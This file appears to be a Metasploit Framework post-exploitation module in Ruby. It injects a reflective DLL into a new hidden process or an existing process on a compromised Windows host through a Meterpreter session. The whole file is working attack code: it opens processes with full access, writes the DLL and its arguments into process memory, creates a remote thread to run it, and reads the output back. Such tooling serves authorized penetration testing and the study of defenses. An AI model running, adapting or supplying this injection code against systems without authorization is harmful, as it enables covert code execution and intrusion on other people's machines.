##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Manage Reflective DLL Injection Module',
        'Description' => %q{
          This module will inject a specified reflective DLL into the memory of a
          process, new or existing. If arguments are specified, they are passed to
          the DllMain entry point as the lpvReserved (3rd) parameter. To read
          output from the injected process, set PID to zero and WAIT to non-zero.
          Make sure the architecture of the DLL matches the target process.
        },
        'License' => MSF_LICENSE,
        'Author' => ['Ben Campbell', 'b4rtik'],
        'Platform' => 'win',
        'SessionTypes' => ['meterpreter'],
        'References' => [
          [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ]
        ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_sys_process_attach
              stdapi_sys_process_execute
              stdapi_sys_process_get_processes
              stdapi_sys_process_getpid
              stdapi_sys_process_kill
              stdapi_sys_process_memory_allocate
              stdapi_sys_process_memory_write
              stdapi_sys_process_thread_create
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [],
          'Reliability' => []
        }
      )
    )
    register_options(
      [
        OptPath.new('PATH', [true, 'Reflective DLL to inject into memory of a process']),
        OptInt.new('PID', [false, 'Pid to inject', 0]),
        OptString.new('PROCESS', [false, 'Process to spawn', 'notepad.exe']),
        OptString.new('ARGUMENTS', [false, 'Command line arguments']),
        OptInt.new('WAIT', [false, 'Time in seconds to wait before reading output', 0])
      ]
    )

    register_advanced_options(
      [
        OptBool.new('KILL', [ true, 'Kill the injected process at the end of the task', false ])
      ]
    )
  end

  def run
    dll_path = ::File.expand_path(datastore['PATH'])
    if File.file?(dll_path)
      run_dll(dll_path)
    else
      print_bad("Dll not found #{dll_path}")
    end
  end

  def pid_exists(pid)
    mypid = client.sys.process.getpid.to_i

    if pid == mypid
      print_bad('Can not select the current process as the injection target')
      return false
    end

    host_processes = client.sys.process.get_processes
    if host_processes.empty?
      print_bad('No running processes found on the target host.')
      return false
    end

    theprocess = host_processes.find { |x| x['pid'] == pid }

    !theprocess.nil?
  end

  def launch_process
    process_name = datastore['PROCESS']
    process_name << '.exe' unless process_name.end_with?('.exe')

    print_status("Launching #{process_name} ...")
    channelized = datastore['WAIT'] != 0

    process = client.sys.process.execute(
      process_name,
      nil,
      'Channelized' => channelized,
      'Hidden' => true
    )

    hprocess = client.sys.process.open(process.pid, PROCESS_ALL_ACCESS)
    print_good("Process #{hprocess.pid} created.")
    [process, hprocess]
  end

  def inject_dll(process, dll_path)
    library_path = ::File.expand_path(dll_path)
    exploit_mem, offset = inject_dll_into_process(process, library_path)
    [exploit_mem, offset]
  end

  def open_process
    pid = datastore['PID'].to_i

    if pid_exists(pid)
      print_status("Opening handle to process #{datastore['PID']}...")
      hprocess = client.sys.process.open(datastore['PID'], PROCESS_ALL_ACCESS)
      print_good('Handle opened')
      [nil, hprocess]
    else
      print_bad('Pid not found')
      [nil, nil]
    end
  end

  def run_dll(dll_path)
    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
    print_status("Running module against #{hostname} (#{session.session_host})")

    if (datastore['PID'] > 0) || (datastore['WAIT'] == 0)
      print_warning('Output unavailable')
    end

    if datastore['PID'] <= 0
      process, hprocess = launch_process
    else
      process, hprocess = open_process
    end

    if hprocess.nil?
      print_bad('Execution finished')
      return
    end

    exploit_mem, offset = inject_dll(hprocess, dll_path)

    if datastore['ARGUMENTS'].nil?
      arg_mem = nil
    else
      arg_mem = copy_args(hprocess)
    end

    print_status('Executing...')
    hprocess.thread.create(exploit_mem + offset, arg_mem)

    if datastore['WAIT'] != 0
      sleep(datastore['WAIT'])
    end

    if (datastore['PID'] <= 0) && (datastore['WAIT'] != 0)
      read_output(process)
    end

    if datastore['KILL']
      print_good("Killing process #{hprocess.pid}")
      client.sys.process.kill(hprocess.pid)
    end

    print_good('Execution finished.')
  end

  def copy_args(process)
    argssize = datastore['ARGUMENTS'].size + 1
    arg_mem = process.memory.allocate(argssize, PAGE_READWRITE)
    params = datastore['ARGUMENTS']
    params += "\x00"

    process.memory.write(arg_mem, params)
    arg_mem
  end

  def read_output(process)
    print_status('Start reading output')
    old_timeout = client.response_timeout
    client.response_timeout = 5

    begin
      loop do
        output = process.channel.read
        if !output.nil? && !output.empty?
          output.split("\n").each { |x| print_good(x) }
        end
        break if output.nil? || output.empty?
      end
    rescue Rex::TimeoutError
      vprint_warning('Time out exception: wait limit exceeded (5 sec)')
    rescue StandardError => e
      print_error("Error: #{e.inspect}")
    end

    client.response_timeout = old_timeout
    print_status('End output.')
  end
end
